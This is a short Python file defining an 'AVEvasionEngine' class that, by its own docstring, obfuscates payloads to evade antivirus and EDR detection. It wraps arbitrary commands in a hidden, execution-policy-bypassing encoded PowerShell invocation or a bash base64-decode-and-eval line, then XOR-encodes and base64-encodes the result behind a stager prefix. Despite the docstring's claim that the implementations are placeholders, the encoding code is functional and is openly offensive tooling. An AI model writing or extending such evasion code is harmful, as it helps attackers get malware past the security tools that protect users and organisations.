from typing import Dict
import base64


class AVEvasionEngine:
    """
    Generates lightly obfuscated payloads to reduce AV/EDR detection.
    Implementations are placeholders (no real process hollowing here).
    """

    def __init__(self, config: Dict | None = None):
        self.config = config or {"xor_key": 11, "xor_stager": b"STAGER"}

    def generate_evasive_payload(self, original_payload: str, target_os: str) -> str:
        if target_os == "windows":
            encoded = base64.b64encode(original_payload.encode()).decode()
            evasive = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
        elif target_os == "linux":
            evasive = self._bash_obfuscate(original_payload)
        else:
            evasive = original_payload

        xor_encoded = self._xor_encode(evasive.encode(), self.config["xor_key"])
        final = self.config["xor_stager"] + xor_encoded
        return base64.b64encode(final).decode()

    def _bash_obfuscate(self, payload: str) -> str:
        b64 = base64.b64encode(payload.encode()).decode()
        return f"bash -c \"eval \\\"$(echo {b64} | base64 -d)\\\"\""

    def _xor_encode(self, data: bytes, key: int) -> bytes:
        return bytes(b ^ key for b in data)
